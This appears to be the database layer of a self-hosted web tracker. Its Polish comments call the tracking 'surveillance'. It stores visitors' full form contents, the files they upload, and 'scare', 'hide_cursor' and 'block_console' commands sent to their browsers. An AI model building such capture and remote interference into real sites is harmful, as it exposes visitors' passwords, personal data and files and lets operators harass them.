import Database from 'better-sqlite3';
import path from 'path';

// Typy dla bazy danych
export interface Event {
    id: string;
    timestamp: string;
    site_id: string;
    session_id: string;
    visitor_id: string;
    event_type: string;
    url: string | null;
    path: string | null;
    hostname: string | null;
    title: string | null;
    referrer: string | null;
    data: string | null;
    ip_hash: string | null;
    created_at: string;
}

export interface Session {
    session_id: string;
    visitor_id: string;
    site_id: string;
    started_at: string;
    last_activity: string | null;
    device_info: string | null;
    utm_params: string | null;
    ip_hash: string | null;
    page_count: number;
    event_count: number;
}

export interface Visitor {
    visitor_id: string;
    first_seen: string;
    last_seen: string | null;
    session_count: number;
    total_pageviews: number;
}

// Interfejs dla logów komunikacji
export interface CommunicationLog {
    id: string;
    timestamp: string;
    site_id: string;
    origin: string | null;
    ip: string;
    method: string;
    endpoint: string;
    status_code: number;
    request_size: number;
    response_size: number;
    duration_ms: number;
    events_count: number;
    error_message: string | null;
    user_agent: string | null;
    session_id: string | null;
    visitor_id: string | null;
}

// Interfejs dla wysłanych formularzy
export interface FormSubmission {
    id: string;
    timestamp: string;
    site_id: string;
    session_id: string;
    visitor_id: string;
    form_id: string | null;
    form_name: string | null;
    form_action: string | null;
    page_url: string | null;
    page_path: string | null;
    form_data: string; // JSON z danymi formularza
    fill_duration: number; // Czas wypełniania w sekundach
    fields_count: number;
    has_files: boolean;
    created_at: string;
}

// Interfejs dla przesłanych plików
export interface UploadedFile {
    id: string;
    timestamp: string;
    site_id: string;
    session_id: string;
    visitor_id: string;
    form_submission_id: string | null;
    field_name: string | null;
    file_name: string;
    file_type: string | null;
    file_size: number;
    file_extension: string | null;
    file_content: Buffer | null; // Opcjonalna zawartość pliku (base64)
    page_url: string | null;
    page_path: string | null;
    created_at: string;
}

// Interfejs dla ustawień śledzenia (inwigilacji)
export interface TrackingSetting {
    id: number;
    setting_type: 'global' | 'site';  // 'global' = cały system, 'site' = per projekt
    site_id: string | null;           // NULL dla global, site_id dla site
    enabled: boolean;                  // Czy śledzenie włączone
    updated_at: string;
    updated_by: string | null;         // Kto zmienił (opcjonalnie)
}

// Interfejs dla zdalnych komend (Remote Control / "Straszak")
export interface RemoteCommand {
    id: string;
    created_at: string;
    site_id: string;                   // Docelowa strona
    session_id: string | null;         // Konkretna sesja (opcjonalnie, NULL = wszystkie)
    command_type: string;              // Typ komendy: 'scare', 'hide_cursor', 'block_console', etc.
    payload: string;                   // JSON z parametrami komendy
    executed: boolean;                 // Czy komenda została wykonana
    executed_at: string | null;        // Kiedy została wykonana
    expires_at: string | null;         // Kiedy wygasa (opcjonalnie)
    created_by: string | null;         // Kto wysłał komendę
}

// Singleton dla połączenia z bazą
let db: Database.Database | null = null;

export function getDb(): Database.Database {
    if (!db) {
        const dbPath = process.env.TRACKER_DB || path.join(process.cwd(), 'tracker.db');
        db = new Database(dbPath);
        db.pragma('journal_mode = WAL');
        db.pragma('synchronous = NORMAL');
        db.pragma('cache_size = 10000');
        db.pragma('temp_store = MEMORY');
        initDb(db);
    }
    return db;
}

// Funkcja do zamykania połączenia (dla graceful shutdown)
export function closeDb(): void {
    if (db) {
        db.close();
        db = null;
    }
}

function initDb(database: Database.Database) {
    // Tabela eventów
    database.exec(`
    CREATE TABLE IF NOT EXISTS events (
      id TEXT PRIMARY KEY,
      timestamp TEXT NOT NULL,
      site_id TEXT NOT NULL,
      session_id TEXT NOT NULL,
      visitor_id TEXT NOT NULL,
      event_type TEXT NOT NULL,
      url TEXT,
      path TEXT,
      hostname TEXT,
      title TEXT,
      referrer TEXT,
      data TEXT,
      ip_hash TEXT,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP
    )
  `);

    // Tabela sesji
    database.exec(`
    CREATE TABLE IF NOT EXISTS sessions (
      session_id TEXT PRIMARY KEY,
      visitor_id TEXT NOT NULL,
      site_id TEXT NOT NULL,
      started_at TEXT NOT NULL,
      last_activity TEXT,
      device_info TEXT,
      utm_params TEXT,
      ip_hash TEXT,
      page_count INTEGER DEFAULT 0,
      event_count INTEGER DEFAULT 0
    )
  `);

    // Tabela odwiedzających
    database.exec(`
    CREATE TABLE IF NOT EXISTS visitors (
      visitor_id TEXT PRIMARY KEY,
      first_seen TEXT NOT NULL,
      last_seen TEXT,
      session_count INTEGER DEFAULT 0,
      total_pageviews INTEGER DEFAULT 0
    )
  `);

    // Indeksy podstawowe
    database.exec(`
    CREATE INDEX IF NOT EXISTS idx_events_timestamp ON events(timestamp);
    CREATE INDEX IF NOT EXISTS idx_events_site ON events(site_id);
    CREATE INDEX IF NOT EXISTS idx_events_session ON events(session_id);
    CREATE INDEX IF NOT EXISTS idx_events_visitor ON events(visitor_id);
    CREATE INDEX IF NOT EXISTS idx_events_type ON events(event_type);
    CREATE INDEX IF NOT EXISTS idx_sessions_visitor ON sessions(visitor_id);
  `);

    // Indeksy złożone dla lepszej wydajności zapytań
    database.exec(`
    CREATE INDEX IF NOT EXISTS idx_events_timestamp_site ON events(timestamp, site_id);
    CREATE INDEX IF NOT EXISTS idx_events_session_created ON events(session_id, created_at);
    CREATE INDEX IF NOT EXISTS idx_events_site_type_timestamp ON events(site_id, event_type, timestamp);
    CREATE INDEX IF NOT EXISTS idx_sessions_site_started ON sessions(site_id, started_at);
    CREATE INDEX IF NOT EXISTS idx_sessions_started_at ON sessions(started_at);
  `);

    // Tabela logów komunikacji (debugger)
    database.exec(`
    CREATE TABLE IF NOT EXISTS communication_logs (
      id TEXT PRIMARY KEY,
      timestamp TEXT NOT NULL,
      site_id TEXT NOT NULL,
      origin TEXT,
      ip TEXT NOT NULL,
      method TEXT NOT NULL,
      endpoint TEXT NOT NULL,
      status_code INTEGER NOT NULL,
      request_size INTEGER DEFAULT 0,
      response_size INTEGER DEFAULT 0,
      duration_ms INTEGER DEFAULT 0,
      events_count INTEGER DEFAULT 0,
      error_message TEXT,
      user_agent TEXT,
      session_id TEXT,
      visitor_id TEXT,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP
    )
  `);

    // Indeksy dla logów komunikacji
    database.exec(`
    CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON communication_logs(timestamp);
    CREATE INDEX IF NOT EXISTS idx_logs_site ON communication_logs(site_id);
    CREATE INDEX IF NOT EXISTS idx_logs_status ON communication_logs(status_code);
    CREATE INDEX IF NOT EXISTS idx_logs_origin ON communication_logs(origin);
    CREATE INDEX IF NOT EXISTS idx_logs_site_timestamp ON communication_logs(site_id, timestamp);
  `);

    // Tabela wysłanych formularzy
    database.exec(`
    CREATE TABLE IF NOT EXISTS form_submissions (
      id TEXT PRIMARY KEY,
      timestamp TEXT NOT NULL,
      site_id TEXT NOT NULL,
      session_id TEXT NOT NULL,
      visitor_id TEXT NOT NULL,
      form_id TEXT,
      form_name TEXT,
      form_action TEXT,
      page_url TEXT,
      page_path TEXT,
      form_data TEXT NOT NULL,
      fill_duration INTEGER DEFAULT 0,
      fields_count INTEGER DEFAULT 0,
      has_files INTEGER DEFAULT 0,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP
    )
  `);

    // Tabela przesłanych plików
    database.exec(`
    CREATE TABLE IF NOT EXISTS uploaded_files (
      id TEXT PRIMARY KEY,
      timestamp TEXT NOT NULL,
      site_id TEXT NOT NULL,
      session_id TEXT NOT NULL,
      visitor_id TEXT NOT NULL,
      form_submission_id TEXT,
      field_name TEXT,
      file_name TEXT NOT NULL,
      file_type TEXT,
      file_size INTEGER DEFAULT 0,
      file_extension TEXT,
      file_content BLOB,
      page_url TEXT,
      page_path TEXT,
      created_at TEXT DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (form_submission_id) REFERENCES form_submissions(id)
    )
  `);

    // Indeksy dla formularzy
    database.exec(`
    CREATE INDEX IF NOT EXISTS idx_forms_timestamp ON form_submissions(timestamp);
    CREATE INDEX IF NOT EXISTS idx_forms_site ON form_submissions(site_id);
    CREATE INDEX IF NOT EXISTS idx_forms_session ON form_submissions(session_id);
    CREATE INDEX IF NOT EXISTS idx_forms_visitor ON form_submissions(visitor_id);
    CREATE INDEX IF NOT EXISTS idx_forms_site_timestamp ON form_submissions(site_id, timestamp);
  `);

    // Indeksy dla plików
    database.exec(`
    CREATE INDEX IF NOT EXISTS idx_files_timestamp ON uploaded_files(timestamp);
    CREATE INDEX IF NOT EXISTS idx_files_site ON uploaded_files(site_id);
    CREATE INDEX IF NOT EXISTS idx_files_session ON uploaded_files(session_id);
    CREATE INDEX IF NOT EXISTS idx_files_form ON uploaded_files(form_submission_id);
    CREATE INDEX IF NOT EXISTS idx_files_site_timestamp ON uploaded_files(site_id, timestamp);
  `);

    // Tabela ustawień śledzenia (mechanizm wł/wył inwigilacji)
    database.exec(`
    CREATE TABLE IF NOT EXISTS tracking_settings (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      setting_type TEXT NOT NULL CHECK(setting_type IN ('global', 'site')),
      site_id TEXT,
      enabled INTEGER NOT NULL DEFAULT 1,
      updated_at TEXT DEFAULT CURRENT_TIMESTAMP,
      updated_by TEXT,
      UNIQUE(setting_type, site_id)
    )
  `);

    // Domyślne ustawienie globalne (włączone) jeśli nie istnieje
    database.exec(`
    INSERT OR IGNORE INTO tracking_settings (setting_type, site_id, enabled, updated_at)
    VALUES ('global', NULL, 1, CURRENT_TIMESTAMP)
  `);

    // Indeksy dla ustawień śledzenia
    database.exec(`
    CREATE INDEX IF NOT EXISTS idx_tracking_site ON tracking_settings(site_id);
    CREATE INDEX IF NOT EXISTS idx_tracking_type ON tracking_settings(setting_type);
  `);

    // Tabela historii czyszczenia danych
    database.exec(`
    CREATE TABLE IF NOT EXISTS cleanup_history (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      timestamp TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
      mode TEXT NOT NULL,
      dry_run INTEGER NOT NULL DEFAULT 0,
      events_deleted INTEGER DEFAULT 0,
      sessions_deleted INTEGER DEFAULT 0,
      visitors_deleted INTEGER DEFAULT 0,
      communication_logs_deleted INTEGER DEFAULT 0,
      form_submissions_deleted INTEGER DEFAULT 0,
      uploaded_files_deleted INTEGER DEFAULT 0,
      total_deleted INTEGER DEFAULT 0,
      filters TEXT,
      message TEXT,
      executed_by TEXT
    )
  `);

    // Indeksy dla historii czyszczenia
    database.exec(`
    CREATE INDEX IF NOT EXISTS idx_cleanup_timestamp ON cleanup_history(timestamp);
    CREATE INDEX IF NOT EXISTS idx_cleanup_mode ON cleanup_history(mode);
  `);

    // Tabela zdalnych komend (Remote Control / "Straszak")
    database.exec(`
    CREATE TABLE IF NOT EXISTS remote_commands (
      id TEXT PRIMARY KEY,
      created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP,
      site_id TEXT NOT NULL,
      session_id TEXT,
      command_type TEXT NOT NULL,
      payload TEXT NOT NULL DEFAULT '{}',
      executed INTEGER NOT NULL DEFAULT 0,
      executed_at TEXT,
      expires_at TEXT,
      created_by TEXT
    )
  `);

    // Indeksy dla zdalnych komend
    database.exec(`
    CREATE INDEX IF NOT EXISTS idx_commands_site ON remote_commands(site_id);
    CREATE INDEX IF NOT EXISTS idx_commands_session ON remote_commands(session_id);
    CREATE INDEX IF NOT EXISTS idx_commands_type ON remote_commands(command_type);
    CREATE INDEX IF NOT EXISTS idx_commands_executed ON remote_commands(executed);
    CREATE INDEX IF NOT EXISTS idx_commands_expires ON remote_commands(expires_at);
    CREATE INDEX IF NOT EXISTS idx_commands_site_executed ON remote_commands(site_id, executed);
  `);
}

// === FUNKCJE DO ZARZĄDZANIA USTAWIENIAMI ŚLEDZENIA ===

/**
 * Sprawdza czy śledzenie jest włączone dla danego site_id
 * Zwraca false jeśli globalnie wyłączone LUB site_id jest wyłączony
 */
export function isTrackingEnabled(siteId: string): boolean {
    const db = getDb();
    
    // WYKLUCZENIE: Nigdy nie śledź samego dashboardu - to bez sensu
    if (siteId.startsWith('dashboard') || siteId.includes('/dashboard')) {
        return false;
    }
    
    // Sprawdź ustawienie globalne
    const globalSetting = db.prepare(`
        SELECT enabled FROM tracking_settings 
        WHERE setting_type = 'global' AND site_id IS NULL
    `).get() as { enabled: number } | undefined;
    
    // Jeśli globalnie wyłączone - zwróć false
    if (globalSetting && globalSetting.enabled === 0) {
        return false;
    }
    
    // Sprawdź ustawienie dla konkretnego site_id
    const siteSetting = db.prepare(`
        SELECT enabled FROM tracking_settings 
        WHERE setting_type = 'site' AND site_id = ?
    `).get(siteId) as { enabled: number } | undefined;
    
    // Jeśli site_id ma jawnie wyłączone - zwróć false
    if (siteSetting && siteSetting.enabled === 0) {
        return false;
    }
    
    // Domyślnie włączone
    return true;
}

/**
 * Pobiera wszystkie ustawienia śledzenia
 */
export function getTrackingSettings(): TrackingSetting[] {
    const db = getDb();
    const settings = db.prepare(`
        SELECT id, setting_type, site_id, enabled, updated_at, updated_by
        FROM tracking_settings
        ORDER BY setting_type DESC, site_id ASC
    `).all() as TrackingSetting[];
    
    return settings.map(s => ({
        ...s,
        enabled: Boolean(s.enabled)
    }));
}

/**
 * Ustawia status śledzenia globalnego
 */
export function setGlobalTrackingEnabled(enabled: boolean, updatedBy?: string): void {
    const db = getDb();
    db.prepare(`
        UPDATE tracking_settings 
        SET enabled = ?, updated_at = CURRENT_TIMESTAMP, updated_by = ?
        WHERE setting_type = 'global' AND site_id IS NULL
    `).run(enabled ? 1 : 0, updatedBy || null);
}

/**
 * Ustawia status śledzenia dla konkretnego site_id
 */
export function setSiteTrackingEnabled(siteId: string, enabled: boolean, updatedBy?: string): void {
    const db = getDb();
    db.prepare(`
        INSERT INTO tracking_settings (setting_type, site_id, enabled, updated_at, updated_by)
        VALUES ('site', ?, ?, CURRENT_TIMESTAMP, ?)
        ON CONFLICT(setting_type, site_id) 
        DO UPDATE SET enabled = ?, updated_at = CURRENT_TIMESTAMP, updated_by = ?
    `).run(siteId, enabled ? 1 : 0, updatedBy || null, enabled ? 1 : 0, updatedBy || null);
}

/**
 * Usuwa ustawienie dla konkretnego site_id (przywraca domyślne zachowanie)
 */
export function removeSiteTrackingSetting(siteId: string): void {
    const db = getDb();
    db.prepare(`
        DELETE FROM tracking_settings 
        WHERE setting_type = 'site' AND site_id = ?
    `).run(siteId);
}

/**
 * Pobiera listę wszystkich śledzonych site_id z bazy
 */
export function getAllTrackedSites(): string[] {
    const db = getDb();
    const sites = db.prepare(`
        SELECT DISTINCT site_id FROM sessions 
        WHERE site_id IS NOT NULL
        ORDER BY site_id ASC
    `).all() as { site_id: string }[];
    
    return sites.map(s => s.site_id);
}

export default getDb;
